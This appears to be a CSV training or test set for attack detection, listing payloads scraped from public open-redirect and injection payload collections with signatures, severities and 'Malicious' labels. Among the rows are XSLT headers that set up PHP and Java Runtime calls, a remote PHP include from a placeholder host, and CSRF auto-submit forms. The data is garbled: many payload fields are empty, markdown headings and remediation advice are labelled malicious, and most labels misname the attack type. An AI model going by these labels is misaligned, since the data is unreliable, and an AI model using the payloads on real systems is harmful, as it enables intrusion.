Payload,Signature,AttackType,Severity,MITRE,Label,Description
"xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"xmlns:exploit=""http://exslt.org/common""",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<html xsl:version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"" version=""1.0"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<html xsl:version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"include(""http://10.10.10.10/test.php"")",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"" version=""1.0"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"" version=""1.0"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:rt=""http://xml.apache.org/xalan/java/java.lang.Runtime"" xmlns:ob=""http://xml.apache.org/xalan/java/java.lang.Object"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet version=""2.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:java=""http://saxon.sf.net/java-type"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:App=""http://www.tempuri.org/App"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
proc.StartInfo.RedirectStandardOutput = true;,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SQLi_Keyword,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<a href=""http://www.example.com/api/setusername?username=CSRFd"">Click Me</a>",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<img src=""http://www.example.com/api/setusername?username=CSRFd"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<form action=""http://www.example.com/api/setusername"" enctype=""text/plain"" method=""POST"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<form id=""autosubmit"" action=""http://www.example.com/api/setusername"" enctype=""text/plain"" method=""POST"">",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%E3%80%82,OpenRedir,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
../http://malicious.com`,Traversal,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
../http://malicious.com`,Traversal,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
%E3%80%82,OpenRedir,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
"response.sendRedirect(""http://www.mysite.com"");",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
<?php,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
/* Redirect browser */,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
"header(""Location: http://www.mysite.com"");",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
?>,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
"Response.Redirect(""~/folder/Login.aspx"")",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
redirect_to login_path,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
"response.sendRedirect(request.getParameter(""url""));",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
$redirect_url = $_GET['url'];,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
"header(""Location: "" . $redirect_url);",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
"string url = request.QueryString[""url""];",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
Response.Redirect(url);,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
redirect_to params[:url],OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
#### Dangerous URL Redirect Example 2,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
ASP.NET MVC 2 LogOn action in,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
#### Preventing Unvalidated Redirects and Forwards,CMDi_Unix,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
Safe use of redirects and forwards can be done in a number of ways:,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
* Simply avoid using redirects and forwards.,CMDi_Unix,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
* Sanitize input by creating a list of trusted URL's (lists of hosts or a regex).,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
#### Open Redirect Payload List :,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",CMDi_Unix,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",CMDi_Unix,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
The user sees the link directing to the original trusted site (",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
example.com,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
"ASP.NET MVC 2 LogOn action in """,CMDi_Unix,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
AccountController.cs,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",CMDi_Unix,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",CMDi_Unix,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",CMDi_Unix,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
",XSS_Script,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
"response.sendRedirect(""http://www.mysite.com"");",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
<?php,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
/* Redirect browser */,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
"header(""Location: http://www.mysite.com"");",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
?>,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
"Response.Redirect(""~/folder/Login.aspx"")",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
redirect_to login_path,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
"response.sendRedirect(request.getParameter(""url""));",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
$redirect_url = $_GET['url'];,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
"header(""Location: "" . $redirect_url);",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (master branch)
